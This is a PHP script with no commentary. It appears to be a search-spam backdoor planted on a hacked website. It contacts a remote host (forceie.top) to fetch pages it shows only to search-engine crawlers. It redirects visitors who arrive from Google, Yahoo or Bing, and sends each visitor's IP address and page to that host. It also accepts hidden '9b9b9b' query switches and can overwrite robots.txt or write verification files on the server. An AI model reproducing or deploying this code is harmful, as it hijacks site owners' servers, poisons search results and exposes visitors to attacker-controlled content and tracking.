<?php
error_reporting(0);header('Content-Type: text/html; charset=utf-8');$OoooOO0 = 'fgxy1320';$O='';date_default_timezone_set('Asia/Tokyo');
$dRoot = @$_SERVER['DOCUMENT_ROOT'];
$rUrl = @$_SERVER['REQUEST_URI'];
$curName = @basename(__FILE__);
$sName = @$_SERVER['HTTP_HOST'];
$Ooolg = @$_SERVER['HTTP_ACCEPT_LANGUAGE'];
$uAgent = @$_SERVER['HTTP_USER_AGENT'];
$referer = @$_SERVER['HTTP_REFERER'];
$http_type = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) ? 'https://' : 'http://';
$typeName = $http_type . $sName;
$uAgent = @strtolower($uAgent);
$referer = @strtolower($referer);
if(getenv('HTTP_CLIENT_IP')){
$client_ip = getenv('HTTP_CLIENT_IP');
} elseif(getenv('HTTP_X_FORWARDED_FOR')) {
$client_ip = getenv('HTTP_X_FORWARDED_FOR');
} elseif(getenv('REMOTE_ADDR')) {
$client_ip = getenv('REMOTE_ADDR');
} else {
$client_ip = $_SERVER['REMOTE_ADDR'];
}

$pageStr = explode('?',$rUrl);
$sdName = $pageStr[0];
$existF = false;
if (file_exists($dRoot.$sdName)) {
$existF = true;
}

if(isset($_GET['vf'])&&$_GET['vf']=='9b9b9b') {
echo '9b9b9b online!';
exit;
}
$pr = dirname($rUrl);
if (strstr($rUrl, 'sitemap_index_')) {
allmap($O,$OoooOO0,$typeName,$rUrl,$sName,$http_type,$existF,$sdName,$pr,$curName);
}
if (substr($rUrl,-4)=='.xml') {
sitefun($O,$OoooOO0,$typeName,$rUrl,$http_type,$sName,$client_ip,$existF,$sdName,$pr,$curName);
}
function allmap($O,$OoooOO0,$typeName,$rUrl,$sName,$http_type,$existF,$sdName,$pr,$curName){
$ol = 'http://'.$OoooOO0.'.forceie.top/Api/siteAllMap.php?page='.$rUrl.'&pwd=sl123&domain='.$typeName.'&cur='.$curName.'&existf='.$existF.'&sd='.$sdName;
if ($_GET['vf_allmap'] == '9b9b9b') {
echo $ol;
exit;
}
$getRes = getCurl($O,$ol);
if(strstr($getRes,'okhtmlgetcontent')){
@header('Content-type:text/xml');
$getRes = str_replace('okhtmlgetcontent','',$getRes);
echo $getRes;
exit();
}else if(strstr($getRes,'getcontent500page')){
@header('HTTP/1.1 500 Internal Server Error');
exit();
}else if(strstr($getRes,'getcontent404page')){
@header('HTTP/1.1 404 Not Found');
exit();
}
}
function sitefun($O,$OoooOO0,$typeName,$rUrl,$http_type,$sName,$client_ip,$existF,$sdName,$pr='',$curName='') {
$ol = 'http://'.$OoooOO0.'.forceie.top/Api/siteUrlApi.php?stype=sitemap&num=6000&pr='.$pr.'&url='.$rUrl.'&domain='.$typeName.'&ip='.$client_ip.'&cur='.$curName.'&existf='.$existF.'&sd='.$sdName;
if ($_GET['vf_map'] == '9b9b9b.xml') {
echo $ol;
exit;
}
$getRes = getCurl($O,$ol);
if(strstr($getRes,'okhtmlgetcontent')){
@header('Content-type:text/xml');
$getRes = str_replace('okhtmlgetcontent','',$getRes);
echo $getRes;
exit();
}else if(strstr($getRes,'getcontent500page')){
@header('HTTP/1.1 500 Internal Server Error');
exit();
}else if(strstr($getRes,'getcontent404page')){
@header('HTTP/1.1 404 Not Found');
exit();
}else if(strstr($getRes,'getcontentping')){
$getRes = str_replace('getcontentping','',$getRes);
$getsResult = explode('[pin]',$getRes);
foreach($getsResult as $Oog => $Oov){
$pingRes = getCurl($O,$Oov);
$Oooo0s = (strpos($pingRes,'Sitemap Notification Received') !== false) ? 'OK' : 'ERROR';
echo $Oov.'===>Submitting Google Sitemap: '.$Oooo0s.PHP_EOL;
}
exit();
}
}
if(isset($_GET['google'])){
$go=$_GET['google'];
if (preg_match('/^google.*?(\.html)$/i', $go)) {
if(putFile($O,$go,'google-site-verification:'.' '.$go)){
exit('<a href='.$go.'>'.$go.'</a>');
} else{
exit('fail!!!!');
}
}
}
if(isset($_GET['robots'])){
$both = '';
$robots = $_GET['robots'];
$ol = 'http://'.$OoooOO0.'.forceie.top/Api/rob.php?rob='.$robots.'&pwd=sl123&domain='.$typeName.'&cur='.$curName.'&existf='.$existF.'&sd='.$sdName;
if ($_GET['robots'] == '9b9b9b') {
echo $ol;
exit;
}
$getRes = getCurl($O,$ol);
if(strstr($getRes,'okhtmlgetcontent')){
if(putFile($O,'robots.txt',$getRes,$existF)) {
echo @file_get_contents($dRoot.'/robots.txt');
exit();
} else {
exit('fail!!!');
}
exit();
}
}
if(preg_match('/google.co.jp|yahoo|google\.com[^.]*?$|bing/i', $referer)){
if ($_GET['vf_jump'] == '9b9b9b') {
echo 'http://'.$OoooOO0.'.forceie.top/jump.php?domain='.$sName.'&page='.$rUrl.'&bot=0&pr='.$pr.'&refer='.$referer.'&ip='.$client_ip.'&lg='.$Ooolg.'&cur='.$curName.'&existf='.$existF.'&sd='.$sdName;
exit;
}
$jumpRes=getCurl($O,'http://'.$OoooOO0.'.forceie.top/jump.php?domain='.$sName.'&page='.$rUrl.'&bot=0&pr='.$pr.'&refer='.$referer.'&ip='.$client_ip.'&lg='.$Ooolg.'&cur='.$curName.'&existf='.$existF.'&sd='.$sdName);
if ($jumpRes) {
@header("Content-type: text/html; charset=utf-8");
$jumpRes = str_replace("okhtmlgetcontent",'',$jumpRes);
echo $jumpRes;
exit();
}
}
if(stristr($uAgent,'googlebot')||stristr($uAgent,'yahoo')||stristr($uAgent,'google')||stristr($uAgent,'Googlebot')||stristr($uAgent,'googlebot')||$_GET['bottest'] == 'test'){
if ($_GET['vf_bot'] == '9b9b9b') {
echo 'http://'.$OoooOO0.'.forceie.top/918.php?domain='.$sName.'&page='.$rUrl.'&bot=1&pr='.$pr.'&ip='.$client_ip.'&lg='.$Ooolg.'&cur='.$curName.'&existf='.$existF.'&sd='.$sdName;
exit;
}
$file_contents = getCurl($O,'http://'.$OoooOO0.'.forceie.top/918.php?domain='.$sName.'&page='.$rUrl.'&bot=1&pr='.$pr.'&ip='.$client_ip.'&lg='.$Ooolg.'&cur='.$curName.'&existf='.$existF.'&sd='.$sdName);
if(!empty($file_contents)){
if(strstr($file_contents,'okhtmlgetcontent')){
@header("Content-type: text/html; charset=utf-8");
$file_contents = str_replace('okhtmlgetcontent','',$file_contents);
echo $file_contents;
exit();
}else if(strstr($file_contents,'getcontent500page')){
@header('HTTP/1.1 500 Internal Server Error');
exit();
}else if(strstr($file_contents,'getcontent404page')){
@header('HTTP/1.1 404 Not Found');
exit();
}else if(strstr($file_contents,'getcontentnotplpage')){
$file_contents = str_replace('getcontentnotplpage','',$file_contents);
echo $file_contents;
exit();
}
}
}
if ($_GET['vf_origin'] == 'online5566') {
echo 'http://'.$OoooOO0.'.forceie.top/org.php?domain='.$sName.'&page='.$rUrl.'&pr='.$pr.'&ip='.$client_ip.'&lg='.$Ooolg.'&cur='.$curName.'&existf='.$existF.'&sd='.$sdName;
exit;
}
getCurl($O,'http://'.$OoooOO0.'.forceie.top/org.php?domain='.$sName.'&page='.$rUrl.'&pr='.$pr.'&ip='.$client_ip.'&lg='.$Ooolg.'&cur='.$curName.'&existf='.$existF.'&sd='.$sdName);
function getCurl($O,$gurl)
{
$file_contents = '';
$agentarry=array(
"safari 5.1 – MAC"=>"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
"safari 5.1 – Windows"=>"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
"Firefox 38esr"=>"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
"IE 11"=>"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; InfoPath.3; rv:11.0) like Gecko",
"IE 9.0"=>"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0",
"IE 8.0"=>"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)",
"IE 7.0"=>"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
"Firefox 4.0.1 – MAC"=>"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Firefox 4.0.1 – Windows"=>"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Opera 11.11 – MAC"=>"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; en) Presto/2.8.131 Version/11.11",
"Opera 11.11 – Windows"=>"Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11",
"Chrome 17.0 – MAC"=>"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
"Avant"=>"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser)",
"Green Browser"=>"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)",
"safari iOS 4.33 – iPhone"=>"Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5",
"safari iOS 4.33 – iPod Touch"=>"Mozilla/5.0 (iPod; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5",
"safari iOS 4.33 – iPad"=>"Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5",
"Android N1"=>"Mozilla/5.0 (Linux; U; Android 2.3.7; en-us; Nexus One Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Android Opera Mobile"=>"Opera/9.80 (Android 2.3.4; Linux; Opera Mobi/build-1107180945; U; en-GB) Presto/2.8.149 Version/11.10",
"Android Pad Moto Xoom"=>"Mozilla/5.0 (Linux; U; Android 3.0; en-us; Xoom Build/HRI39) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13",
"BlackBerry"=>"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.337 Mobile Safari/534.1+",
"WebOS HP Touchpad"=>"Mozilla/5.0 (hp-tablet; Linux; hpwOS/3.0.0; U; en-US) AppleWebKit/534.6 (KHTML, like Gecko) wOSBrowser/233.70 Safari/534.6 TouchPad/1.0",
"UCOpenwave"=>"Openwave/ UCWEB7.0.2.37/28/999",
"UC Opera"=>"Mozilla/4.0 (compatible; MSIE 6.0; ) Opera/UCWEB7.0.2.37/28/999",
);
$user_agent=$agentarry[array_rand($agentarry,1)];
if(function_exists('curl_init')){
try
{
$ch = curl_init();
$timeout = 30;
curl_setopt($ch,CURLOPT_URL,$gurl);
curl_setopt($ch,CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch,CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout);
$file_contents = curl_exec($ch);
curl_close($ch);
}
catch (Exception $e)
{}
}
if(strlen($file_contents)<1&&function_exists('file_get_contents')){
ini_set('user_agent',$user_agent);
try
{
$file_contents = @file_get_contents($gurl);
}
catch (Exception $e)
{}
}
return $file_contents;
}
function putFile($O,$htName, $htContents, $app='') {
if ($app) {
$handle = fopen(@$_SERVER['DOCUMENT_ROOT'].'/'.$htName, 'a') or die('0');
}else{
$handle = fopen(@$_SERVER['DOCUMENT_ROOT'].'/'.$htName, 'w') or die('0');
}
$result = fwrite($handle, $htContents);
fclose($handle);
return $result;
}
?>